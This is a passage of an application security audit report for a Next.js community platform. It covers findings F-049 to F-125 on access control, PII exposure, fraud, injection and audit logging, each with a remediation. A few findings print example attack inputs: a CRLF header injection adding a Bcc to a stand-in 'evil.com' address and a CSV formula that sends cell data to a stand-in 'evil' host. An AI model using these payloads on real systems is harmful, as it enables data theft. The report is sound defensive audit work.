**Location:** [app/api/notifications/[id]/route.ts](../../app/api/notifications/[id]/route.ts)

DELETE/PATCH on `/api/notifications/[id]` does not verify `notification.userEmail === session.user.email` before mutating. An attacker can read/delete other users' notifications by ID enumeration (UUID, but UUIDs may leak in support tickets / screenshots).
**Remediation:** Add explicit ownership filter on every mutation: `where: { id, userEmail: session.user.email }`.

---

### F-050: Wallet history accessible by enumerable user email (indirect IDOR on financial data)

**Severity:** Medium
**CWE:** CWE-639 | **OWASP:** A01:2021 | **Cat refs:** Cat 4
**Location:** [app/api/wallet/](../../app/api/wallet/)

Wallet history endpoint accepts `userEmail` query param without verifying it matches the session. A user can request another user's transaction history by guessing the email. **Remediation:** Drop the `userEmail` param; always derive from `session.user.email`. CORE-only override gated behind explicit permission + audit log.

---

### F-051: Notification-message content unfiltered when returned via GET (PII echo)

**Severity:** Medium
**CWE:** CWE-359 | **Cat refs:** Cat 6
**Location:** [app/api/notifications/](../../app/api/notifications/)

Notification messages may contain PII (other users' names, emails, addresses) and are returned without sanitization. **Remediation:** Filter sensitive fields out of notification payloads; reference IDs instead of raw text.

---

### F-052: AuditLog metadata JSON contains unredacted PII; visible to all CORE

**Severity:** Medium
**CWE:** CWE-359 | **Cat refs:** Cat 6, Cat 25
**Location:** [lib/audit.ts](../../lib/audit.ts)

`logAudit({ metadata: { /* anything */ } })` writes arbitrary objects to `AuditLog.metadata`. Callers often pass full request bodies (with PII). All CORE users can then read this PII via the audit-log UI. **Remediation:** Document a strict schema for `metadata`; redact email/phone/SSN-like patterns at write time; filter on read for non-`audit:FULL_ACCESS` callers.

---

### F-053: Soft-delete filtering inconsistent across queries

**Severity:** Medium
**CWE:** CWE-285 | **Cat refs:** Cat 6, Cat 23
**Location:** Multiple `prisma.*.findMany` callsites

6+ callsites do not filter `deletedAt: null`; deleted records leak into list views. Re-stated from Cat 23. **Remediation:** Add a Prisma extension (middleware) that injects `deletedAt: null` by default for all soft-delete-bearing models; require explicit `includeDeleted: true` opt-in for the few admin views that need it.

---

### F-054: PublicUser.signupIp returned in admin API responses

**Severity:** Medium
**CWE:** CWE-359 | **Cat refs:** Cat 6, Cat 13
**Location:** [app/api/admin/public-users/route.ts](../../app/api/admin/public-users/route.ts)

Internal-use field `signupIp` is included in admin JSON. Should remain server-internal. **Remediation:** Strip `signupIp` from the API select; expose only on a dedicated audit-trail view.

---

### F-055: PersonalVault model exists but is unused; PII still stored plaintext

**Severity:** Medium
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information) | **Cat refs:** Cat 6, Cat 13, Cat 27
**Location:** [prisma/schema.prisma](../../prisma/schema.prisma)

A `PersonalVault` Prisma model exists (intended for encrypted PII), but no code reads/writes to it. PII (phone, address, school) is stored plaintext on the user model. **Remediation:** Implement the vault: encrypt PII at rest using `lib/encryptedSession.ts` (post-F-006 fix); migrate existing rows; restrict decryption to authenticated owner + audit-logged admin reads.

---

### F-056: Account merge / signup callback prefers higher role on collision

**Severity:** Medium
**CWE:** CWE-269 | **Cat refs:** Cat 3
**Location:** [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86)

If a user exists in both `Member` and `CommunityMember` (data inconsistency), the `signIn` callback resolves to CORE (the higher role). No application-level invariant enforces mutual exclusion. **Remediation:** Enforce uniqueness across the three user tables via a unique partial index on email; on collision, reject signin and require manual reconciliation.

---

### F-057: Multi-device session — role/permission downgrade does not invalidate other devices

**Severity:** Medium
**CWE:** CWE-613 | **Cat refs:** Cat 1, Cat 3
**Location:** [lib/auth-options.ts](../../lib/auth-options.ts)

Same root cause as F-004; tracked separately for the multi-device dimension. Even after F-004 remediation lands (tokenVersion), make sure `tokenVersion` is per-user-not-per-device, so any change invalidates *all* devices. **Remediation:** Add a "Sessions" admin UI listing active devices and allowing per-device revoke (requires session table per F-004 remediation #4).

---

### F-058: Email lookup uses `mode: 'insensitive'` but does not normalize Unicode NFC

**Severity:** Medium
**CWE:** CWE-176 (Improper Handling of Unicode Encoding) | **Cat refs:** Cat 22, Cat 28, Cat 29
**Location:** [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86)

Two visually identical emails using different Unicode normalization forms (`café@x.com` vs `café@x.com` in NFC vs NFD) compare unequal in PostgreSQL. Combined with F-059 alias permissiveness, an attacker can register multiple accounts. **Remediation:** Normalize all emails to NFC + lowercase + alias-strip before storing AND querying.

---

### F-059: Email aliasing not normalized — Sybil door

**Severity:** Medium
**CWE:** CWE-345 | **Cat refs:** Cat 12, Cat 22
**Location:** [lib/auth-options.ts](../../lib/auth-options.ts)

Gmail's `+suffix` and `.` aliasing means `john.smith+1@gmail.com`, `johnsmith@gmail.com`, `j.o.h.n.s.m.i.t.h@gmail.com` are the same inbox but distinct database rows. Enables Sybil farming. **Remediation:** Normalize Gmail-style aliases (strip `+suffix`, strip `.` from local-part) before unique-checks. Use a third-party normalization library to handle other providers.

---

### F-060: Disposable email domains not filtered on signup

**Severity:** Medium
**CWE:** CWE-345 | **Cat refs:** Cat 22
**Location:** [lib/auth-options.ts](../../lib/auth-options.ts)

mailinator/guerrilla/tempmail domains are accepted at signup. Enables account farming for points/swag/bounty fraud. **Remediation:** Maintain a blocklist of disposable domains (use `disposable-email-domains` npm package); reject signups matching.

---

### F-061: No CAPTCHA on signup or any high-risk action

**Severity:** Medium
**CWE:** CWE-799 | **Cat refs:** Cat 22
**Location:** [app/api/auth/](../../app/api/auth/)

No CAPTCHA on signup, swag redeem, contact form. Bot farming is line-rate. **Remediation:** Integrate hCaptcha or Cloudflare Turnstile on signup, swag redeem, contact form, public submissions.

---

### F-062: No phone verification

**Severity:** Medium
**CWE:** CWE-345 | **Cat refs:** Cat 22

No SMS/voice verification on signup; phone numbers (where collected, e.g., Speedrun) are unverified strings. **Remediation:** Optional phone-OTP for high-risk actions; mandatory for Bounty.cash withdrawals.

---

### F-063: No device fingerprinting; client-supplied device-id accepted

**Severity:** Medium
**CWE:** CWE-345 | **Cat refs:** Cat 22

If any flow trusts `device-id` from the client (some PWA flows do), the attacker rotates IDs to bypass per-device limits. **Remediation:** Use server-derived stable fingerprint (FingerprintJS Pro or homegrown UA+IP hash) for analytics/abuse signals; never trust client IDs for security gates.

---

### F-064: No IP reputation / Tor / VPN detection

**Severity:** Medium
**CWE:** CWE-940 | **Cat refs:** Cat 22

No geolocation, ASN, or known-bad-IP filtering on auth/signup. **Remediation:** Integrate IPQualityScore or similar; flag Tor exits and known VPN ranges for additional friction (CAPTCHA challenge, no high-value actions).

---

### F-065: Swag redemption has no per-user/day velocity gate

**Severity:** Medium
**CWE:** CWE-799 | **Cat refs:** Cat 21, Cat 22
**Location:** [app/api/swag/[id]/redeem/route.ts](../../app/api/swag/[id]/redeem/route.ts)

User can redeem unlimited swag per day. **Remediation:** Cap at 3 redemptions per user per 24h.

---

### F-066: No redemption / withdrawal risk scoring

**Severity:** Medium
**CWE:** CWE-754 | **Cat refs:** Cat 22
**Location:** [app/api/swag/](../../app/api/swag/)

No risk model evaluating redemption requests (new account, high-value, suspicious shipping address). **Remediation:** Build a simple risk score combining account-age, points-velocity, address-fraud-checks; flag scores > threshold for manual review.

---

### F-067: Admin login has no impossible-travel detection

**Severity:** Medium
**CWE:** CWE-778 | **Cat refs:** Cat 22, Cat 25
**Location:** [lib/auth-options.ts](../../lib/auth-options.ts)

Two admin signins from geo-distant IPs within 1 hour are not flagged. **Remediation:** Store last signin geo; compute Haversine on next signin; require step-up auth if > 1000 km in < 1h.

---

### F-068: No anomaly detection on balance-earning patterns

**Severity:** Medium
**CWE:** CWE-778 | **Cat refs:** Cat 22, Cat 25
**Location:** [lib/wallet.ts](../../lib/wallet.ts)

No baseline of normal earning velocity; sudden 10×spike per user is undetected. **Remediation:** Daily job computing per-user `WalletTransaction` velocity; alert > 3σ above 30-day baseline.

---

### F-069: Email captured but not verified in Speedrun registration

**Severity:** Medium
**CWE:** CWE-345 | **Cat refs:** Cat 22
**Location:** [app/api/speedrun/runs/[slug]/register/route.ts](../../app/api/speedrun/runs/[slug]/register/route.ts)

A registration can specify any email address (not necessarily the session email — the form takes a free-text "team captain email"). Could be used to impersonate / spam. **Remediation:** Require an email-confirmation step before the registration is finalized (send a verify link).

---

### F-070: Custom email body SSTI / template injection

**Severity:** Medium
**CWE:** CWE-94 | **Cat refs:** Cat 14
**Location:** [lib/email.ts:199-249](../../lib/email.ts#L199-L249)

The `getCustomApprovalEmailTemplate` function takes admin-supplied template strings and substitutes `{{var}}` values. If template syntax is permissive (e.g., supports expressions), CORE-supplied templates could execute server-side. Currently low-impact (CORE-only) but worth hardening. **Remediation:** Use a restricted template engine (Handlebars with no helpers, or simple `{{var}}` regex replacement only) — no expression evaluation.

---

### F-071: CRLF header injection via contact form / admin email broadcast

**Severity:** Medium
**CWE:** CWE-93 | **Cat refs:** Cat 14
**Location:** [app/api/public/contact/route.ts:20-41](../../app/api/public/contact/route.ts#L20-L41), [app/api/event-feedback/send-email/route.ts](../../app/api/event-feedback/send-email/route.ts)

User-supplied subject/from-name fields are interpolated into email headers without CRLF stripping. While most modern SMTP libs sanitize, depending on nodemailer version, an attacker injecting `\r\nBcc: leak@evil.com` could exfiltrate. **Remediation:** Strip `\r\n` from any user input destined for headers; use the SMTP library's named parameters rather than string concat.

---

### F-072: HMAC search index re-uses encryption key (key-mixing weakness)

**Severity:** Medium
**CWE:** CWE-326 | **Cat refs:** Cat 20
**Location:** [lib/encryptedSession.ts](../../lib/encryptedSession.ts)

The blind-index HMAC for searchable encrypted columns uses the same key as AES-GCM encryption. Key reuse across primitives is a hygiene violation; a flaw in either reduces security of the other. **Remediation:** Derive distinct sub-keys via HKDF: `encKey = HKDF(masterKey, "encryption")`, `macKey = HKDF(masterKey, "search-index")`.

---

### F-073: Referral code entropy weak — `Math.random()` (predictable)

**Severity:** Medium
**CWE:** CWE-338 (Use of Cryptographically Weak PRNG) | **Cat refs:** Cat 12, Cat 20, Cat 22
**Location:** [lib/speedrun.ts](../../lib/speedrun.ts)

Speedrun referral codes are generated with `Math.random()`, which is non-CSPRNG. Codes are predictable from preceding codes. Attackers can enumerate active codes to attribute conversions. **Remediation:** Replace with `crypto.randomBytes(8).toString('base32')` or `nanoid(10)`.

---

### F-074: Avatar fetch endpoint forwards Twitter handle to unavatar.io (limited SSRF)

**Severity:** Medium
**CWE:** CWE-918 | **Cat refs:** Cat 18
**Location:** [app/api/avatar/route.ts](../../app/api/avatar/route.ts) (or equivalent)

Endpoint takes `?handle=` and proxies to `https://unavatar.io/twitter/${handle}` without validating handle format. Limited SSRF (can only target unavatar.io subpaths, not arbitrary URLs), but path-traversal in handle could redirect. **Remediation:** Validate handle as `[a-zA-Z0-9_]{1,15}` before interpolation.

---

### F-075: Luma event data validation incomplete; admin view renders titles unsanitized

**Severity:** Medium
**CWE:** CWE-79 | **Cat refs:** Cat 18, Cat 24
**Location:** [lib/luma.ts](../../lib/luma.ts), [app/core/events/](../../app/core/events/)

Event data fetched from Luma API is rendered in admin views (titles, descriptions). Combined with F-008 CSP, a malicious Luma event title could XSS admins. **Remediation:** Sanitize all third-party data via DOMPurify before render; enforce a strict event-title schema (≤ 200 chars, no HTML).

---

### F-076: Vercel Blob upload token grants unrestricted path-write

**Severity:** Medium
**CWE:** CWE-285 | **Cat refs:** Cat 19, Cat 24
**Location:** [app/api/upload/token/route.ts](../../app/api/upload/token/route.ts)

The Blob upload token returned to clients does not restrict the upload `pathname` — an authenticated user can overwrite any other user's blob path. **Remediation:** Use Vercel Blob's `addRandomSuffix: true` and `pathname` allowlist (e.g., scope to `users/${userId}/uploads/`).

---

### F-077: Cloudinary signed upload params accept arbitrary `folder`

**Severity:** Medium
**CWE:** CWE-639 | **Cat refs:** Cat 19, Cat 24
**Location:** [app/api/upload/cloudinary/route.ts](../../app/api/upload/cloudinary/route.ts) (or equivalent)

Signed upload params lock `eager`/`format` but not `folder` — client can write into any folder. Combined with admin-side selectors that list folders, an attacker can place attacker-controlled images into another user's folder. **Remediation:** Server-side derive `folder` from session; sign it; reject client-supplied folder param.

---

### F-078: Formula injection in Speedrun registrations CSV export

**Severity:** Medium
**CWE:** CWE-1236 | **Cat refs:** Cat 19
**Location:** [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts)

Cells starting with `=`, `+`, `-`, `@`, or `\t` are executed as formulas in Excel/Sheets. A malicious team-name like `=HYPERLINK("http://evil/?p="&A1)` exfiltrates other cells. **Remediation:** Prefix any cell starting with these characters with a single quote (`'`). Or wrap all cells in quotes.

---

### F-079: Media `links[]` array lacks URL allowlist validation

**Severity:** Medium
**CWE:** CWE-601 (Open Redirect) | **Cat refs:** Cat 19
**Location:** [app/api/media/](../../app/api/media/)

Media items accept arbitrary URLs in their `links` array. Renders as clickable `<a href>` in member-facing UI. Combined with F-033 (XSS sinks), can be used for `javascript:` URLs or Open Redirect chains. **Remediation:** Validate URLs as `https?://` only; reject `javascript:`, `data:`; consider domain allowlist for the most sensitive surfaces.

---

### F-080: OG-tag fetcher / preview not exploitable but lacks size cap; partial SSRF guard only

**Severity:** Medium
**CWE:** CWE-918 | **Cat refs:** Cat 18
**Location:** [lib/](../../lib/)

If a link-preview / OG-tag fetcher is added in future, current scaffolding lacks SSRF guard (no IP-range blocklist for 169.254.169.254 / 127.0.0.0/8 / 10.0.0.0/8 / 172.16.0.0/12 / 192.168.0.0/16 / RFC-1918). **Remediation:** Use a dedicated SSRF-safe HTTP client wrapper; resolve DNS + reject internal ranges before connect; cap response size.

---

### F-081: Google Calendar refresh token in same DB column as access token

**Severity:** Medium
**CWE:** CWE-312 | **Cat refs:** Cat 24
**Location:** [prisma/schema.prisma](../../prisma/schema.prisma)

Both tokens encrypted at rest but co-located in same row, same encryption key. DB exfil = both compromised. **Remediation:** Separate KMS key for refresh tokens; consider hashicorp Vault / Vercel KMS integration.

---

### F-082: Luma API key trusted on poll without HMAC

**Severity:** Medium
**CWE:** CWE-345 | **Cat refs:** Cat 24
**Location:** [lib/luma.ts](../../lib/luma.ts)

Outbound poll uses bearer token; inbound webhook (if any) would need to verify Luma's signature. Currently no inbound webhooks per recon, so risk is limited to the API-key being leaked from logs/Vercel-env. **Remediation:** Rotate Luma API key quarterly; restrict Luma org permissions to read-only.

---

### F-083: SMTP credentials in environment variables (no rotation, no per-env separation)

**Severity:** Medium
**CWE:** CWE-798 | **Cat refs:** Cat 24
**Location:** [lib/email.ts:5-10](../../lib/email.ts#L5-L10)

SMTP_USER/SMTP_PASS in plain env. No documented rotation cadence; same credentials likely shared across all envs (per F-014 chain). **Remediation:** Rotate quarterly; use a transactional-email provider with API-key + per-env keys (Resend, Postmark, SES with IAM roles).

---

### F-084: Cron schedule modifications via PR not gated

**Severity:** Medium
**CWE:** CWE-345 | **Cat refs:** Cat 26
**Location:** [vercel.json](../../vercel.json)

A PR modifying cron schedules merges with normal review; no required-reviewer rule for `vercel.json`. Combined with F-035 (drift), cron timing/auth could be silently weakened. **Remediation:** Add CODEOWNERS requiring security-team review for `vercel.json`, `next.config.ts`, and `prisma/schema.prisma` changes.

---

### F-085: next-auth v4 approaching EOL; BlockNote pre-1.0 dependency risk

**Severity:** Medium
**CWE:** CWE-1104 (Use of Unmaintained Third-Party Components) | **Cat refs:** Cat 26
**Location:** [package.json](../../package.json)

`next-auth@4` will be superseded by Auth.js v5; BlockNote is pre-1.0 with breaking-change risk. Plan migrations now. **Remediation:** Track in roadmap; pin to specific minor versions; schedule migration to next-auth v5 within 6 months.

---

### F-086: No `/api/me/export` endpoint — Right-of-Access (GDPR Art. 15 / DPDP §11)

**Severity:** Medium (regulatory)
**CWE:** CWE-359 | **Cat refs:** Cat 27

No user-facing "download my data" endpoint. SAR responses must be assembled manually. **Remediation:** Build `/api/me/export` returning a JSON dump of all user-PII rows across all tables. Include a `digest` for verification.

---

### F-087: No unsubscribe mechanism on emails

**Severity:** Medium (regulatory) | **CWE:** CWE-359 | **Cat refs:** Cat 27
**Location:** [lib/email.ts](../../lib/email.ts)

Outbound emails lack `List-Unsubscribe` header and an in-app preferences UI. **Remediation:** Add `List-Unsubscribe: <mailto:unsubscribe@team1.io>, <https://app/unsubscribe?t=...>` header; implement preferences page.

---

### F-088: Vercel Analytics loads pre-consent

**Severity:** Medium (regulatory) | **CWE:** CWE-1295 | **Cat refs:** Cat 27
**Location:** [app/layout.tsx](../../app/layout.tsx)

`<Analytics />` and `<SpeedInsights />` load on first paint with no cookie-consent banner. EU/UK visitors are tracked without consent; ePrivacy Directive violation. **Remediation:** Implement cookie-consent banner; defer analytics scripts until consent.

---

### F-089: No grievance officer / DPO endpoint (DPDP §10)

**Severity:** Medium (regulatory) | **CWE:** CWE-359 | **Cat refs:** Cat 27

DPDP requires publishing contact for a Grievance Officer. No `/contact-dpo` or similar endpoint. **Remediation:** Publish contact in privacy policy; build a tracked grievance-submission endpoint with SLA.

---

### F-090: No age gate / parental-consent flow

**Severity:** Medium (regulatory) | **CWE:** CWE-359 | **Cat refs:** Cat 27

No date-of-birth check; minors (under 18 in DPDP, under 16 in GDPR) can sign up freely. **Remediation:** Self-attested DOB at signup; parental-consent flow for under-18 (verifiable parent email + click-confirmation).

---

### F-091: No breach-notification capability codified in repo

**Severity:** Medium (regulatory) | **CWE:** CWE-755 | **Cat refs:** Cat 27

No tooling/runbook in repo for the 72h DPDP/GDPR breach-notification deadline. **Remediation:** Document the runbook; integrate with status-page / ticketing.

---

### F-092: Wallet operations log to WalletTransaction only; no AuditLog

**Severity:** Medium (HIGH in financial-audit context) | **CWE:** CWE-778 | **Cat refs:** Cat 7, Cat 12, Cat 25, Cat 27
**Location:** [lib/wallet.ts:28-262](../../lib/wallet.ts#L28-L262)

`WalletTransaction` is a data table (the ledger), not an audit table. No way to forensically reconstruct *who* triggered each grant/spend (especially for `adminAdjust` — it stores description but not actor email reliably). **Remediation:** Add `logAudit` calls inside `earnReward`, `spendPoints`, `adminAdjust`, `expirePoints`. Include actor email, target email, amount, before/after balance.

---

### F-093: Member status / tag updates not audited

**Severity:** Medium | **CWE:** CWE-778 | **Cat refs:** Cat 25
**Location:** [app/api/members/[id]/route.ts](../../app/api/members/[id]/route.ts)

PATCH on `/api/members/[id]` (status, tags) does not write AuditLog. **Remediation:** Add `logAudit({ action: 'MEMBER_UPDATE', changes: diff(before, after) })`.

---

### F-094: 2FA enable/disable / passkey register actions not audited

**Severity:** Medium | **CWE:** CWE-778 | **Cat refs:** Cat 25
**Location:** [app/api/me/2fa/](../../app/api/me/2fa/)

Auth-strength changes are unaudited. **Remediation:** Audit all 2FA mutations.

---

### F-095: Swag redemption (SwagOrder.create) not audit-logged

**Severity:** Medium | **CWE:** CWE-778 | **Cat refs:** Cat 25
**Location:** [app/api/swag/[id]/redeem/route.ts](../../app/api/swag/[id]/redeem/route.ts)

Only `SwagOrder` row + `WalletTransaction`; no AuditLog. **Remediation:** `logAudit({ action: 'SWAG_REDEEM' })`.

---

### F-096: Public monitoring endpoints leak deployment internals

**Severity:** Medium | **CWE:** CWE-200 | **Cat refs:** Cat 10, Cat 25
**Location:** [app/api/health/route.ts](../../app/api/health/route.ts), [app/api/monitoring/](../../app/api/monitoring/)

`/api/health` and `/api/monitoring/*` return version, dependency status, and possibly DB stats to anonymous callers. **Remediation:** Gate `/api/monitoring/*` to authenticated CORE only; `/api/health` returns minimal `{ ok: true }` to anonymous.

---

### F-097: Pagination cursor IDs readable in response

**Severity:** Medium | **CWE:** CWE-200 | **Cat refs:** Cat 2, Cat 4
**Location:** Multiple list endpoints

Cursor-based pagination returns the next-cursor as a raw record ID. Allows enumeration of unowned IDs (mild IDOR aid). **Remediation:** Return opaque cursors (signed `{cursor, expiresAt}` payload) or HMAC-protected tokens.

---

### F-098: Aggregate / count endpoints return totals across restricted scopes

**Severity:** Medium | **CWE:** CWE-200 | **Cat refs:** Cat 2

Some count endpoints return totals across rows the caller cannot read — leaks existence info. **Remediation:** Filter aggregate queries by the same WHERE clause as the read query.

---

### F-099: Export endpoint skips per-row permission check

**Severity:** Medium | **CWE:** CWE-285 | **Cat refs:** Cat 2, Cat 19
**Location:** [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts)

Top-level role check only; no per-row scoping (e.g., only export rows the caller is responsible for). **Remediation:** Filter export rows by caller's scope of responsibility (`assignedAdmin = session.user.id`).

---

### F-100: Outbound event-application emails include data the recipient shouldn't see

**Severity:** Medium | **CWE:** CWE-359 | **Cat refs:** Cat 2, Cat 13
**Location:** [app/api/applications/](../../app/api/applications/)

Application notification emails are sent to a hardcoded recipient list including PII fields the recipients aren't authorized to see (e.g., applicant phone). **Remediation:** Send per-recipient summary emails with only the fields each recipient is authorized for; never include raw form-response data in cross-recipient emails.

---

### F-101: Blind `prisma.member.update()` — no optimistic concurrency / version column

**Severity:** Medium | **CWE:** CWE-362 | **Cat refs:** Cat 2, Cat 28, Cat 29
**Location:** [app/api/members/[id]/permissions/route.ts:43-46](../../app/api/members/[id]/permissions/route.ts#L43-L46)

Two simultaneous PATCHes race; last writer wins, silently overwriting concurrent edits. **Remediation:** Add `version: Int @default(0)` to `Member`; require client to send current version; bump on each update; reject mismatch with 409.

---

### F-102: Negative-amount edge case in `spendPoints()`

**Severity:** Medium | **CWE:** CWE-20 | **Cat refs:** Cat 12
**Location:** [lib/wallet.ts:86-152](../../lib/wallet.ts#L86-L152)

`if (amount <= 0)` guard missing; calling `spendPoints(user, -100)` *credits* 100 and decrements `totalSpent`. Currently no externally-callable route does this, but the primitive is unsafe. **Remediation:** Add the guard. See F-022.

---

### F-103: Suspected 32-bit Int overflow on UserWallet balance fields

**Severity:** Medium | **CWE:** CWE-190 | **Cat refs:** Cat 12, Cat 28
**Location:** [prisma/schema.prisma:659-706](../../prisma/schema.prisma#L659-L706), [lib/wallet.ts](../../lib/wallet.ts)

`pointsBalance`, `totalEarned`, `totalSpent`, `totalExpired` are `Int` (32-bit signed). With no input cap (F-022), an admin grant of 1.5B points wraps to negative. **Remediation:** Migrate to `BigInt`; or rigorously enforce per-call cap (F-022 mitigation also covers this).

---

### F-104: No velocity / Sybil check on signup

**Severity:** Medium | **CWE:** CWE-799 | **Cat refs:** Cat 12, Cat 22
**Location:** [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86)

Unlimited PublicUser creation per IP. Combined with F-059/F-060/F-061, signup is line-rate. **Remediation:** 5 signups per IP per day; CAPTCHA challenge on suspicious signups.

---

### F-105: Profile-picture URL leaks via Referer header

**Severity:** Low | **CWE:** CWE-200 | **Cat refs:** Cat 13

User avatars hosted on Cloudinary or Vercel Blob load with default Referer policy; on click-through to a third-party site, the avatar URL leaks. **Remediation:** Add `Referrer-Policy: strict-origin-when-cross-origin` (already default on modern browsers — verify and codify in `next.config.ts`).

---

### F-106: TOTP timing window too permissive (±1 period = 90s)

**Severity:** Low | **CWE:** CWE-294 | **Cat refs:** Cat 11
**Location:** TOTP module (lib/totp.ts or 2FA route)

Accepts ±1 30s period. Total acceptance window = 90s. Recommend ±0 or ±1 only on first attempt of a session. **Remediation:** Use `window: 1` only; consider tightening to 0 after the first successful verification of a session.

---

### F-107: Recovery codes single-use not enforced at DB layer

**Severity:** Low | **CWE:** CWE-294 | **Cat refs:** Cat 11
**Location:** [lib/recoveryCodes.ts](../../lib/recoveryCodes.ts)

A rapid-replay race could let the same recovery code be used twice. Application enforces single-use but lacks DB unique constraint or atomic mark-used. **Remediation:** Use transactional `UPDATE ... WHERE used = false RETURNING *` to atomically claim a code.

---

### F-108: Passkey challenge stored in wrong field (design flaw)

**Severity:** Low | **CWE:** CWE-1390 | **Cat refs:** Cat 11
**Location:** [app/api/me/passkeys/](../../app/api/me/passkeys/)

Challenge stored alongside credential metadata rather than in a dedicated short-lived store. Functional but fragile; concurrent registration attempts could collide. **Remediation:** Store challenges in a Redis-like ephemeral store keyed by session ID, TTL 60s.

---

### F-109: Passkey challenge reused during registration vs authentication

**Severity:** Low | **CWE:** CWE-294 | **Cat refs:** Cat 11
**Location:** [app/api/me/passkeys/](../../app/api/me/passkeys/)

Same challenge value used for register and authenticate flows. WebAuthn spec requires fresh randomness per ceremony. **Remediation:** Generate a new challenge for each ceremony; bind challenge to ceremony type.

---

### F-110: Account-enumeration timing in signIn callback

**Severity:** Low | **CWE:** CWE-204 | **Cat refs:** Cat 11
**Location:** [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86)

`signIn` for known emails takes longer (extra DB writes, role assignment) than for unknown — measurable timing oracle for "is this email registered?". Mitigated by Google OAuth gate (only OAuth-validated emails reach this code), but still a fingerprintable side channel. **Remediation:** Pad timing with `setTimeout(..., 500)` or perform a dummy work step on the unknown-email path.

---

### F-111: CORS / cross-origin headers minimal — no explicit Access-Control response

**Severity:** Low | **CWE:** CWE-942 | **Cat refs:** Cat 10
**Location:** [next.config.ts](../../next.config.ts)

No explicit CORS policy in headers. Default Next.js behavior is "same-origin only", which is correct, but missing the explicit `Access-Control-Allow-Origin` makes audits / scanners flag it. **Remediation:** Explicitly emit `Access-Control-Allow-Origin: <origin>` for `/api/*` routes; deny by default.

---

### F-112: X-XSS-Protection legacy header missing

**Severity:** Low | **CWE:** CWE-1021 | **Cat refs:** Cat 10
**Location:** [next.config.ts](../../next.config.ts)

Modern browsers ignore this header (use CSP instead) but older browsers and pen-test reports still flag it. **Remediation:** Add `X-XSS-Protection: 0` (explicit disable, OWASP-recommended modern stance).

---

### F-113: Permissions-Policy minimal — no explicit deny for camera/mic/geo

**Severity:** Low | **CWE:** CWE-1021 | **Cat refs:** Cat 10
**Location:** [next.config.ts](../../next.config.ts)

No `Permissions-Policy` header denying camera/mic/geolocation/USB. App doesn't currently use these, so attacker-injected scripts could opportunistically use them. **Remediation:** Add `Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=(), browsing-topics=()`.

---

### F-114: CSV export Content-Type missing for XSS prevention

**Severity:** Low | **CWE:** CWE-79 | **Cat refs:** Cat 19
**Location:** [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts)

Without `Content-Type: text/csv` and `Content-Disposition: attachment`, browsers may sniff and render as HTML, executing payloads in cells. **Remediation:** Set both headers explicitly.

---

### F-115: Service Worker version not pinned — cache poisoning by stale SW after rollback

**Severity:** Low | **CWE:** CWE-345 | **Cat refs:** Cat 15, Cat 26
**Location:** [public/sw.js](../../public/sw.js)

If a deploy is rolled back, the new SW (older code) might serve cached responses from the newer-but-rolled-back version. **Remediation:** Embed a build-hash in the SW filename and the cache-name; client checks `navigator.serviceWorker.register('/sw-${buildHash}.js')`.

---

### F-116: PWA manifest icon paths fetched without integrity check

**Severity:** Low | **CWE:** CWE-353 | **Cat refs:** Cat 15
**Location:** [public/manifest.json](../../public/manifest.json)

Manifest icons load over HTTPS but no SRI / hash. Tampering at the CDN edge would be undetected. **Remediation:** Pin icons to the same-origin and use long-lived immutable cache headers; periodically verify hash.

---

### F-117: Speedrun referral self-exploitation via email aliasing

**Severity:** Low | **CWE:** CWE-345 | **Cat refs:** Cat 12, Cat 22
**Location:** [app/api/speedrun/runs/[slug]/register/route.ts:141-154](../../app/api/speedrun/runs/[slug]/register/route.ts#L141-L154)

Self-referral check compares emails strictly; aliasing bypass per F-059. Currently only inflates `conversions` counter (no rewards), but if rewards are added later this becomes HIGH. **Remediation:** Normalize emails (F-059); explicitly reject self-referral by normalized email.

---

### F-118: Member.name lacks DB length cap

**Severity:** Low | **CWE:** CWE-400 | **Cat refs:** Cat 28
**Location:** [prisma/schema.prisma](../../prisma/schema.prisma)

Vercel's 2 MB body cap is the only ceiling; very-long names could bloat list responses. **Remediation:** Add `@db.VarChar(200)` on `Member.name` and similar fields.

---

### F-119: Prisma JSON parsing without zod for some fields

**Severity:** Low | **CWE:** CWE-20 | **Cat refs:** Cat 28
**Location:** Multiple routes

A few routes accept `req.body` and pass JSON fields directly to Prisma without zod parsing — type-coercion attacks possible (e.g., string → boolean coercion). **Remediation:** Add zod schemas everywhere user input enters Prisma.

---

### F-120: No global request size limit beyond Vercel default

**Severity:** Low | **CWE:** CWE-770 | **Cat refs:** Cat 21
**Location:** [vercel.json](../../vercel.json)

4.5 MB POST body cap is the only protection. **Remediation:** Add per-route `bodyParser.sizeLimit` in handlers (Next.js route config); keep small (32 KB for most routes, 5 MB for upload-handler).

---

### F-121: ReDoS risk in input validation regex

**Severity:** Low | **CWE:** CWE-1333 | **Cat refs:** Cat 21
**Location:** [lib/](../../lib/)

One suspicious nested-quantifier regex pattern was flagged. **Remediation:** Audit; rewrite without nested quantifiers; use `safe-regex` lint rule.

---

### F-122: Data-grid endpoint fetches all records without pagination

**Severity:** Low | **CWE:** CWE-770 | **Cat refs:** Cat 21
**Location:** [app/api/](../../app/api/)

A specific data-grid backend pulls all rows (no `take`/`skip`). DoS via 100k+ rows. **Remediation:** Enforce server-side pagination; cap at 100 rows per request.

---

### F-123: Bounty.cash field unbounded

**Severity:** Low | **CWE:** CWE-20 | **Cat refs:** Cat 30
**Location:** [prisma/schema.prisma](../../prisma/schema.prisma)

Admin can typo a 7-figure cash bounty. **Remediation:** Cap at a configurable max (₹1,00,000?); require dual-control above cap.

---

### F-124: Indexes missing on 3 high-cardinality query patterns

**Severity:** Low | **CWE:** CWE-407 | **Cat refs:** Cat 23
**Location:** [prisma/schema.prisma](../../prisma/schema.prisma)

Three query patterns lack supporting indexes (per Cat 23 scan). DoS-adjacent: an attacker repeating a slow query can saturate the DB. **Remediation:** Add indexes per Cat 23 recommendations.

---

### F-125: Vercel Analytics `userEmail` field may violate GDPR

**Severity:** Info | **CWE:** CWE-359 | **Cat refs:** Cat 27
**Location:** [app/layout.tsx](../../app/layout.tsx)

